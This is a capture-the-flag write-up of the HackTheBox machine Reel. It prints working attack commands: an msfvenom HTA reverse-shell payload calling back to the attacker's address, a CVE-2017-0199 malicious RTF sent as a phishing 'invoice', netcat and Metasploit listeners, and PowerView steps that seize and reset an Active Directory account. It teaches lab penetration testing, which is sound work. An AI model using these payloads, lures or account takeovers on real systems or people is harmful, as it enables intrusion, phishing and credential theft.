---
title: HTB: Reel
url: https://0xdf.gitlab.io/2018/11/10/htb-reel.html
date: 2018-11-10T10:11:10+00:00
difficulty: Hard [40]
os: Windows
tags: hackthebox, htb-reel, ctf, ftp, cve-2017-0199, rtf, hta, phishing, ssh, bloodhound, powerview, active-directory, metasploit, htb-bart
---

![](https://0xdfimages.gitlab.io/img/reel-cover.png)Reel was an awesome box because it presents challenges rarely seen in CTF environments, phishing and Active Directory. Rather than initial access coming through a web exploit, to gain an initial foothold on Reel, I’ll use some documents collected from FTP to craft a malicious rtf file and phishing email that will exploit the host and avoid the protections put into place. Then I’ll pivot through different AD users and groups, taking advantage of their different rights to eventually escalate to administrator. In Beyond Root, I’ll explore remnants of a second path to root that didn’t make the final cut, look at the ACLs on root.txt, examine the script that opens attachments as nico.

## Box Info

| Name | [Reel](https://hackthebox.com/machines/reel)  [Reel](https://hackthebox.com/machines/reel) [Play on HackTheBox](https://hackthebox.com/machines/reel) |
| --- | --- |
| Release Date | 23 Jun 2018 |
| Retire Date | 04 May 2024 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Reel |
| Radar Graph | Radar chart for Reel |
| First Blood User | 00:43:35[m0noc m0noc](https://app.hackthebox.com/users/4365) |
| First Blood Root | 05:27:49[phra phra](https://app.hackthebox.com/users/19822) |
| Creator | [egre55 egre55](https://app.hackthebox.com/users/1190) |

## Recon

### nmap

`nmap` shows only ftp, ssh, and smtp open. It looks like a Windows box based on ftp:

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.77
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-26 14:30 EDT
Nmap scan report for 10.10.10.77
Host is up (0.18s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
25/tcp open  smtp

Nmap done: 1 IP address (1 host up) scanned in 87.64 seconds

root@kali# nmap -sU -p- --min-rate 5000 -oA nmap/alludp 10.10.10.77
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-26 14:36 EDT
Nmap scan report for 10.10.10.77
Host is up (0.10s latency).
All 65535 scanned ports on 10.10.10.77 are open|filtered

Nmap done: 1 IP address (1 host up) scanned in 27.23 seconds

root@kali# nmap -sV -sC -p 21,22,25 -oA nmap/initial 10.10.10.77
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-26 14:37 EDT
Nmap scan report for 10.10.10.77
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst:
|_  SYST: Windows_NT
22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey:
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp open  smtp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello:
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help:
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions:
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|_    sequence of commands
|     sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP,
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
...[snip]...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 182.64 seconds

```

### FTP

#### Enumeration

`nmap` reported that anonymous logins are accepted. So I’ll connect, using anything as the password:

```

root@kali# ftp 10.10.10.77
Connected to 10.10.10.77.
220 Microsoft FTP Service
Name (10.10.10.77:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.

```

Looking around, there’s a dir `documents` with three docs:

```

ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
05-29-18  12:19AM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.

```

I’ll grab all three files:

```

ftp> prompt
Interactive mode off.
ftp> mget *
local: AppLocker.docx remote: AppLocker.docx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2047 bytes received in 0.10 secs (19.2425 kB/s)
local: readme.txt remote: readme.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
124 bytes received in 0.10 secs (1.1592 kB/s)
local: Windows Event Forwarding.docx remote: Windows Event Forwarding.docx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
14581 bytes received in 0.21 secs (68.8589 kB/s)

```

#### AppLocker.docx

Just one line in this document, but something to keep in mind as I try to get code execution:

> AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.

#### readme.txt

This document is also short, but does give a hint as to the kinds of documents that will be read:

> please email me any rtf format procedures - I’ll review and convert.
>
> new format / converted documents will be saved here.

#### Windows Event Forwarding.docx

There’s a bunch of stuff in here, but what’s really interesting for my purposes is the metadata (note added by me):

```

root@kali# exiftool Windows\ Event\ Forwarding.docx
ExifTool Version Number         : 10.96
File Name                       : Windows Event Forwarding.docx
Directory                       : .
File Size                       : 14 kB
File Modification Date/Time     : 2018:07:02 08:22:05-04:00
File Access Date/Time           : 2018:07:02 08:22:05-04:00
File Inode Change Date/Time     : 2018:07:02 08:22:05-04:00
File Permissions                : rwxrwx---
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com   <-- email address!!
Revision Number                 : 4
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
Template                        : Normal.dotm
Total Edit Time                 : 5 minutes
Pages                           : 2
Words                           : 299
Characters                      : 1709
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 14
Paragraphs                      : 4
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 :
Company                         :
Links Up To Date                : No
Characters With Spaces          : 2004
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 14.0000

```

There’s an email address in there: `nico@megabank.com`

### SMTP Enumeration

With SMTP, it’s useful to enumerate valid users. I’ll show both manually and using a script.

#### Manually

To make sure I understand what’s going on, I’ll start testing manually with `telnet`:

```

root@kali# telnet 10.10.10.77 25
Trying 10.10.10.77...
Connected to 10.10.10.77.
Escape character is '^]'.
220 Mail Service ready
HELO 0xdf.com
250 Hello.
MAIL FROM: <0xdf@aol.com>
250 OK
RCPT TO: <0xdf@megabank.com>
550 Unknown user
RCPT TO: <nico@megabank.com>
250 OK
RCPT TO: <nico@reel.htb>
250 OK
RCPT TO: <admin@reel.htb>
250 OK
RCPT TO: <0xdf@reel.htb>
250 OK
RCPT TO: <0xdf@leer.htb>
250 OK

```

It seems to accept any user `@reel.htb`, but it’s a bit more discriminating with `@megabank`. That’s promising for the email address I found earlier.

#### stmp-enum-users

PentestMonkey has a script, [`smtp-enum-users`](http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum), which will try to enumerate SMTP users with three modes. I’ll generate a list of users to check:

```

root@kali# cat test-users.txt
reel
administrator
admin
root
reel@htb
reel@htb.local
reel@reel.htb
administrator@htb
admin@htb
root@htb
sadfasdfasdfasdf@htb
nico@megabank.com
0xdf@megabank.com
htb@metabank.com

```

EXPN and VRFY returned no hits. RCPT does what I did manually above, and returns the same results:

```

root@kali# smtp-user-enum -M RCPT -U test-users.txt -t 10.10.10.77
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... test-users.txt
Target count ............. 1
Username count ........... 14
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Mon Nov  5 11:31:07 2018 #########
10.10.10.77: reel@htb exists
10.10.10.77: reel@htb.local exists
10.10.10.77: reel@reel.htb exists
10.10.10.77: administrator@htb exists
10.10.10.77: admin@htb exists
10.10.10.77: root@htb exists
10.10.10.77: sadfasdfasdfasdf@htb exists
10.10.10.77: nico@megabank.com exists
######## Scan completed at Mon Nov  5 11:31:07 2018 #########
8 results.

13 queries in 1 seconds (13.0 queries / sec)

```

It looks like anything with htb in the domain, and `nico@megabank.com` comes back as valid.

## Phishing with RTF Dynamite

### RTF Exploit

At the time of Reel’s release, there was a popular RTF exploit that was being used very commonly in broad-based attacks, [CVE-2017-0199](https://nvd.nist.gov/vuln/detail/CVE-2017-0199). The Metasploit module description does a good job explaining it at a high level:

> Description:
> This module creates a malicious RTF file that when opened in
> vulnerable versions of Microsoft Word will lead to code execution.
> The flaw exists in how a olelink object can make a http(s) request,
> and execute hta code in response. This bug was originally seen being
> exploited in the wild starting in Oct 2016. This module was created
> by reversing a public malware sample.

To exploit CVE-2017-0199, I’ll get the user will open an malicious RTF file, which will make an HTTP request for an HTA file. I’ll want that HTA file to execute code to give me a shell.

### Without Metasploit

#### Generate Documents

First, I’ll use `msfvenom` to generate an HTA file that will give me a reverse shell:

```

root@kali# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f hta-psh -o msfv.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 6535 bytes
Saved as: msfv.hta

```

Next, I’ll create an RTF file, using scripts from [this GitHub](https://github.com/bhdresh/CVE-2017-0199) and the following options:
- `-M gen` - generate document
- `-w invoice.rtf` - output file name
- `-u http://10.10.14.3/msfv.hta` - url to get the hta from
- `-t rtf` - create rtf document (as opposed to ppsx)
- `-x 0` - disable rtf obfuscation

```

root@kali# python CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.3/msfv.hta -t rtf -x 0
Generating normal RTF payload.

Generated invoice.rtf successfully

```

#### Send Email / Shell

With the document’s prepped, I’ll start a python http.server to serve the hta file, a nc listener to catch my shell, and then send the phish. I’ll use `sendemail` with the following options:
- `-f` - from address, can be anything as long as the domain exists
- `-t` - to address, `nico@megabank.com`
- `-u` - subject
- `-m` - body
- `-a` - attachment
- `-s` - smtp server
- `-v` - verbose

```

root@kali# sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.10.10.77 -v
Nov 05 12:30:43 kali sendEmail[20365]: DEBUG => Connecting to 10.10.10.77:25
Nov 05 12:30:43 kali sendEmail[20365]: DEBUG => My IP address is: 10.10.14.3
Nov 05 12:30:43 kali sendEmail[20365]: SUCCESS => Received:     220 Mail Service ready
Nov 05 12:30:43 kali sendEmail[20365]: INFO => Sending:         EHLO kali
Nov 05 12:30:43 kali sendEmail[20365]: SUCCESS => Received:     250-REEL, 250-SIZE 20480000, 250-AUTH LOGIN PLAIN, 250 HELP
Nov 05 12:30:43 kali sendEmail[20365]: INFO => Sending:         MAIL FROM:<0xdf@megabank.com>
Nov 05 12:30:43 kali sendEmail[20365]: SUCCESS => Received:     250 OK
Nov 05 12:30:43 kali sendEmail[20365]: INFO => Sending:         RCPT TO:<nico@megabank.com>
Nov 05 12:30:43 kali sendEmail[20365]: SUCCESS => Received:     250 OK
Nov 05 12:30:43 kali sendEmail[20365]: INFO => Sending:         DATA
Nov 05 12:30:43 kali sendEmail[20365]: SUCCESS => Received:     354 OK, send.
Nov 05 12:30:43 kali sendEmail[20365]: INFO => Sending message body
Nov 05 12:30:43 kali sendEmail[20365]: Setting content-type: text/plain
Nov 05 12:30:43 kali sendEmail[20365]: DEBUG => Sending the attachment [invoice.rtf]
Nov 05 12:30:54 kali sendEmail[20365]: SUCCESS => Received:     250 Queued (11.609 seconds)
Nov 05 12:30:54 kali sendEmail[20365]: Email was sent successfully!  From: <0xdf@megabank.com> To: <nico@megabank.com> Subject: [Invoice Attached] Attachment(s): [invoice.rtf] Server: [10.10.10.77:25]

```

Shortly after that, I get a shell:

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.77] 54014
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
htb\nico

```

Here’s what that looks like (takes about 35 seconds):

![](https://0xdfimages.gitlab.io/img/reel-shell.gif)

### Metasploit

Metasploit has a module for CVE-2017-0199, `exploit/windows/fileformat/office_word_hta`, which takes generates the document and takes care of the servers.

I’ll set up the options for this module, and run it:

```

msf5 exploit(windows/fileformat/office_word_hta) > options

Module options (exploit/windows/fileformat/office_word_hta):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  invoice.doc      yes       The file name.
   SRVHOST   10.10.14.3       yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT   80               yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH   default.hta      yes       The URI to use for the HTA file

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Microsoft Office Word

msf5 exploit(windows/fileformat/office_word_hta) > run
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.3:443
[+] invoice.doc stored at /root/.msf4/local/invoice.doc
[*] Using URL: http://10.10.14.3:80/default.hta
[*] Server started.

```

At this point, metasploit has created the document for me, and started two listeners, one on 80 to server the HTA file, and one on 443 to get a callback from meterpreter. It’s my job to get the rtf document to the target.

I’ll send the email the same as in the manual way, but this time with the Metasploit-generated document:

```

root@kali# sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a /root/.msf4/local/invoice.doc -s 10.10.10.77 -v
Nov 05 12:06:20 kali sendEmail[20127]: DEBUG => Connecting to 10.10.10.77:25
Nov 05 12:06:20 kali sendEmail[20127]: DEBUG => My IP address is: 10.10.14.3
Nov 05 12:06:20 kali sendEmail[20127]: SUCCESS => Received:     220 Mail Service ready
Nov 05 12:06:20 kali sendEmail[20127]: INFO => Sending:         EHLO kali
Nov 05 12:06:20 kali sendEmail[20127]: SUCCESS => Received:     250-REEL, 250-SIZE 20480000, 250-AUTH LOGIN PLAIN, 250 HELP
Nov 05 12:06:20 kali sendEmail[20127]: INFO => Sending:         MAIL FROM:<0xdf@megabank.com>
Nov 05 12:06:20 kali sendEmail[20127]: SUCCESS => Received:     250 OK
Nov 05 12:06:20 kali sendEmail[20127]: INFO => Sending:         RCPT TO:<nico@megabank.com>
Nov 05 12:06:20 kali sendEmail[20127]: SUCCESS => Received:     250 OK
Nov 05 12:06:20 kali sendEmail[20127]: INFO => Sending:         DATA
Nov 05 12:06:20 kali sendEmail[20127]: SUCCESS => Received:     354 OK, send.
Nov 05 12:06:20 kali sendEmail[20127]: INFO => Sending message body
Nov 05 12:06:20 kali sendEmail[20127]: Setting content-type: text/plain
Nov 05 12:06:20 kali sendEmail[20127]: DEBUG => Sending the attachment [/root/.msf4/local/invoice.doc]
Nov 05 12:06:27 kali sendEmail[20127]: SUCCESS => Received:     250 Queued (6.562 seconds)
Nov 05 12:06:27 kali sendEmail[20127]: Email was sent successfully!  From: <0xdf@megabank.com> To: <nico@megabank.com> Subject: [Invoice Attached] Attachment(s): [invoice.doc] Server: [10.10.10.77:25]

```

A minute later, in the metasploit window:

```

[*] Sending stage (179779 bytes) to 10.10.10.77
[*] Meterpreter session 1 opened (10.10.14.3:443 -> 10.10.10.77:53907) at 2018-11-05 12:06:40 -0500
msf5 exploit(windows/fileformat/office_word_hta) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: HTB\nico

```

### User.txt

With either shell, I can to to `\users\nico\desktop` and find `user.txt`:

```

C:\Users\nico\Desktop>type user.txt
fa363aeb...

```

## Privesc: nico -> tom

On nico’s desktop, there’s a file, `cred.xml`:

```

C:\Users\nico\Desktop>type cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d2
0f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>

```

PowerShell has this object called a PSCredential, which provides a method to store usernames, passwords, and credentials. There’s also two functions, `Import-CliXml` and `Export-CliXml` , which are used to save these credentials to and restore them from a file. This file is the output of `Export-CliXml`.

I can get a plaintext password from the file by loading it with `Import-CliXml`, and then dumping the results:

```

C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB

```

I could use that credential to do a PowerShell RunAs (as I did in [Bart](/2018/07/15/htb-bart.html#powershell-run-as)), but that password works for ssh as tom:

```

root@kali# ssh tom@10.10.10.77
tom@10.10.10.77's password:
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

tom@REEL C:\Users\tom>whoami
htb\tom

```

## Privesc via AD - Overview

### Enumeration

Tom has a directory on his desktop called “AD Audit”. In it, there’s a `note.txt`:

> Findings:
>
> Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).
>
> Maybe we should re-run Cypher query against other groups we’ve created.

A few directories deeper, there’s more files:

```

C:\users\tom\desktop\AD Audit\BloodHound\Ingestors> dir

    Directory: C:\users\tom\desktop\AD Audit\BloodHound\Ingestors

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---        11/16/2017  11:50 PM     112225 acls.csv
-a---        10/28/2017   9:50 PM       3549 BloodHound.bin
-a---        10/24/2017   4:27 PM     246489 BloodHound_Old.ps1
-a---        10/24/2017   4:27 PM     568832 SharpHound.exe
-a---        10/24/2017   4:27 PM     636959 SharpHound.ps1

```

`acls.cvs` seems particularly interesting. Pull that back.

### ACLs Analysis - Manual

Before breaking out Bloodhound, it’s useful to understand the kind of data that we’re working with. Here’s an example row:

| ObjectName | ObjectType | ObjectGuid | PrincipalName | PrincipalType | ActiveDirectoryRights | ACEType | AccessControlType | IsInherited |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| herman@HTB.LOCAL | USER |  | nico@HTB.LOCAL | USER | WriteOwner |  | AccessAllowed | False |

This row say that for the USER object herman, nico has the WriteOwner right. [This blog post](https://adsecurity.org/?p=3658) on adsecurity.org has detailed information about how these rights work, and how they can be exploited, but this gives nico a lot of control over herman.

I’ll load the csv into LibreOffice Calc, set the data to a table with filters, and and freeze the header row. Then, to see what objects tom has rights over, I’ll filter on tom:

![filter-for-tom](https://0xdfimages.gitlab.io/img/reel-tom-filter.gif)

So tom has WriteOwner rights over claire:

![1541468889702](https://0xdfimages.gitlab.io/img/1541468889702.png)

If I do the same filter for claire, I’ll see claire has WriteDacl rights over the Backup\_Admins group object:

![1541468962624](https://0xdfimages.gitlab.io/img/1541468962624.png)

Since Backup\_Admins sounds like it has good potential, that’ll be my plan.

### Bloodhound

Bloodhound is a tool to take that analysis I just did in spreadsheets, and visualize it. This one computer had 880 relationships / edges in it’s graph. Imagine what an active directory environment of 100,000 computers would look like. Bloodhound finds paths between two objects in these large environments.

#### Installation / Setup

Installation instructions are documented on [this blog](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/). However, with the release of Bloodhound 2.0, Bloodhound no longer accepts csv data for importing. When I originally solved Reel, before the release of 2.0, that wasn’t an issue. But today, it is. So I will install an older version that can handle csv.

To install Bloodhound on Kali, you can `apt install bloodhound`. But to get an older version, I’ll build it from source.
- From `/opt/`, I’ll run `git clone https://github.com/BloodHoundAD/BloodHound.git` to check out the code from git.
- `cd BloodHound` to get into the directory
- Looking at the [release page](https://github.com/BloodHoundAD/BloodHound/releases), it looks like the last 1.x version was 1.52, around April 13. I found a commit that was from that timeframe, and checked it out with `git checkout a3d5d02226`.
- Then I ran the commands from this page on (building from source](https://github.com/BloodHoundAD/BloodHound/wiki/Building-BloodHound-from-source).

The next steps are the same for `apt` installation or building from source:
- Run `neo4j console`, which opens the `neo4j` web interface
- Log in at `http://127.0.0.1:7474/` with username/password “neo4j”/”neo4j”. You’ll have to change your password on login. Close the window (but don’t exit `neo4j` in the console).
- Run `bloodhound` from a new terminal window. Log in with the creds you just set:
  ![1541442202938](https://0xdfimages.gitlab.io/img/1541442202938.png)
- Click on the “Upload Data” button: ![1541469730760](https://0xdfimages.gitlab.io/img/1541469730760.png)
- Select the csv file

#### Analysis

With data loaded, the default view is all the paths to Domain Admin. As tom said in his note, there’s no paths from user to Domain Admin, so it’s just empty.

I’ll start with tom. After putting tom in as the user, I’ll look at “First Degree Object Control” to see what object tom directly controls, and then “Transitive Object Control” to see where that could go if iterated out. Sometimes if the graph is hard to read, the refresh button will redraw it better:

![](https://0xdfimages.gitlab.io/img/reel-bloodhound.gif)

This analysis shows the same path to Backup\_Admins through claire.

## Privesc: tom -> claire

To move to the claire account, I’ll use the WriteOwner permission along with the functionality of PowerView to take the following steps:
- Become owner of claire’s ACL
- Get permissions on that ACL
- Use those permissions to change the password

For each of these steps, I’ll need PowerView, and PowerShell. Luckily, there’s a copy in `C:\Users\tom\Desktop\AD Audit\BloodHound`, so I will start up PowerShell and import it:

```

tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>powershell
Windows PowerShell
Copyright (C) 2014 Microsoft Corporation. All rights reserved.

PS C:\Users\tom\Desktop\AD Audit\BloodHound> . .\PowerView.ps1

```

Next, I’ll set tom as the owner of claire’s ACL:

```

PS C:\users\tom\desktop\AD Audit\BloodHound> Set-DomainObjectOwner -identity claire -OwnerIdentity tom

```

Next, I’ll give tom permissions to change passwords on that ACL:

```

PS C:\users\tom\desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword

```

Now, I’ll create a credential, and then set claire’s password:

```

PS C:\users\tom\desktop\AD Audit\BloodHound> $cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
PS C:\users\tom\desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $cred

```

Now I can use that password to ssh in as claire:

```

root@kali# ssh claire@10.10.10.77
claire@10.10.10.77's password:
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

claire@REEL C:\Users\claire>

```

## Privesc: claire -> Backup\_Admins

From the analysis before, I know that claire has WriteDacl rights on the Backup\_Admins group. I can use that to add her to the group. First, see that the only member of the group is ranj:

```

claire@REEL C:\Users\claire>net group backup_admins
Group name     Backup_Admins
Comment

Members
-------------------------------------------------------------------------------
ranj
The command completed successfully.

```

Now add claire:

```

claire@REEL C:\Users\claire>net group backup_admins claire /add
The command completed successfully.

claire@REEL C:\Users\Administrator>net group backup_admins
Group name     Backup_Admins
Comment

Members
-------------------------------------------------------------------------------
claire                   ranj
The command completed successfully.

```

Despite the fact that it shows claire now in the group, I had to log out and back in to get it to take effect.

## Privesc: Backup\_Admins -> Administrator

Back in as claire and in Backup\_Admins, I can check the permissions on the Administrator folder:

```

claire@REEL C:\Users>icacls Administrator
Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)
              HTB\Backup_Admins:(OI)(CI)(F)
              HTB\Administrator:(OI)(CI)(F)
              BUILTIN\Administrators:(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files

```

Perfect. I’m done, right? There’s the flag on the desktop… but I can’t read it:

```

claire@REEL C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is CC8A-33E1

 Directory of C:\Users\Administrator\Desktop

01/21/2018  02:56 PM    <DIR>          .
01/21/2018  02:56 PM    <DIR>          ..
11/02/2017  09:47 PM    <DIR>          Backup Scripts
10/28/2017  11:56 AM                32 root.txt
               1 File(s)             32 bytes
               3 Dir(s)  15,725,092,864 bytes free

claire@REEL C:\Users\Administrator\Desktop>type root.txt
Access is denied.
claire@REEL C:\Users\Administrator\Desktop>icacls root.txt
root.txt: Access is denied.

```

After so I’ll check the “Backup Scripts” folder:

```

claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir
 Volume in drive C has no label.
 Volume Serial Number is CC8A-33E1

 Directory of C:\Users\Administrator\Desktop\Backup Scripts

11/02/2017  09:47 PM    <DIR>          .
11/02/2017  09:47 PM    <DIR>          ..
11/03/2017  11:22 PM               845 backup.ps1
11/02/2017  09:37 PM               462 backup1.ps1
11/03/2017  11:21 PM             5,642 BackupScript.ps1
11/02/2017  09:43 PM             2,791 BackupScript.zip
11/03/2017  11:22 PM             1,855 folders-system-state.txt
11/03/2017  11:22 PM               308 test2.ps1.txt
               6 File(s)         11,903 bytes
               2 Dir(s)  15,725,092,864 bytes free

```

Looking through the scripts, at the very top of `BackupScript.ps1`, there’s this:

```

# admin password
$password="Cr4ckMeIfYouC4n!"

```

With the admin password, I can ssh in as administrator, and get the flag:

```

root@kali# ssh administrator@10.10.10.77
administrator@10.10.10.77's password:
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

administrator@REEL C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is CC8A-33E1

 Directory of C:\Users\Administrator\Desktop

21/01/2018  15:56    <DIR>          .
21/01/2018  15:56    <DIR>          ..
02/11/2017  22:47    <DIR>          Backup Scripts
28/10/2017  12:56                32 root.txt
               1 File(s)             32 bytes
               3 Dir(s)  15,757,074,432 bytes free

administrator@REEL C:\Users\Administrator\Desktop>type root.txt
1018a033...

```

## Beyond Root

### Remnants of a Former Path

As root, I discovered julia had a `.ost` Offline Outlook Data file in her directory:

```

PS C:\Users\julia\AppData\Local\Microsoft\Outlook> ls *.ost

    Directory: C:\Users\julia\AppData\Local\Microsoft\Outlook

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---        31/10/2017     22:30   16818176 julia@megabank.com - Julia.ost

```

I’ll pull that file back, and use `readpst` to parse the ost into readable text:

```

root@kali# readpst julia.ost
Opening PST file and indexes...
Processing Folder "Deleted Items"
Processing Folder "Inbox"
Processing Folder "Outbox"
Processing Folder "Sent Items"
Processing Folder "Calendar"
Processing Folder "Contacts"
Processing Folder "Conversation Action Settings"
Processing Folder "Drafts"
Processing Folder "Journal"
Processing Folder "Junk E-Mail"
Processing Folder "Notes"
Processing Folder "Tasks"
Processing Folder "Sync Issues"
Processing Folder "RSS Feeds"
Processing Folder "Quick Step Settings"
        "julia.ost" - 15 items done, 0 items skipped.
        "Contacts" - 0 items done, 1 items skipped.
Processing Folder "Conflicts"
Processing Folder "Local Failures"
Processing Folder "Server Failures"
        "Sync Issues" - 3 items done, 0 items skipped.
        "Calendar" - 0 items done, 4 items skipped.
        "Inbox" - 3 items done, 10 items skipped.
        "Sent Items" - 2 items done, 0 items skipped.
root@kali# ls
 Inbox.mbox   julia.ost  'Sent Items.mbox'

```

Now I can use `mutt -Rf [mbox]` to open the `mbox` files and browse the mail (the files are just text, and could also just be opened with a text editor).

The Inbox contains three emails:
- From brad to julia, subject “AD Audits”:

  > “Just so you know, I’ve asked Tom to a audit our AD permissions.  I just want to be sure that any changes we made don’t reduce security! Oh and I saw your note about smartcreds – I agree much better than a password!”

  This is good background for the BloodHound data in Tom’s dir.
- From julia to julia, subject “My password”:

  > Password: !!qpqpqp2017@@”

  This password does work if I ssh in as julia.
- From tom to claire, herman, julia, and ranj, subject “Backup Job / Group Permissions”:

  > “As you know, the backup job/script in the Administrator profile has been consistently failing - maybe the password is wrong.  I’ve gone ahead and added Ranj to the “Backup\_Admins” group so he can start troubleshooting - as it has access to this location.”

